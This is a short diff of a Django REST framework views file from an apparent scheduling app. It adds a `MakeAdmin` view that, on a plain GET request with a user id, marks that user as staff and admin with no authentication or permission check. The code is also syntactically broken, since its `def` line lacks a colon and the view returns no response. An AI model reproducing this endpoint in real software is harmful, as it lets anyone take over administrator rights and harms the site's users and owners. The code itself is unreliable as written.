@@ -102,6 +102,13 @@ class CoordinateScheduleViewSet(viewsets.ModelViewSet):
   serializer_class = CoordinateScheduleSerializer 
   queryset = CoordinateSchedule.objects.all()  
 
+class MakeAdmin(APIView):
+    def get(self, request, pk, format=None)
+        user = User.objects.get(id=pk)
+        user.staff = True
+        user.admin = True
+        user.save()
+
 class SavedScheduleList(APIView):
     def get(self, request, pk, format=None):
         schedules = Schedule.objects.filter(user=pk).order_by('-timestamp')
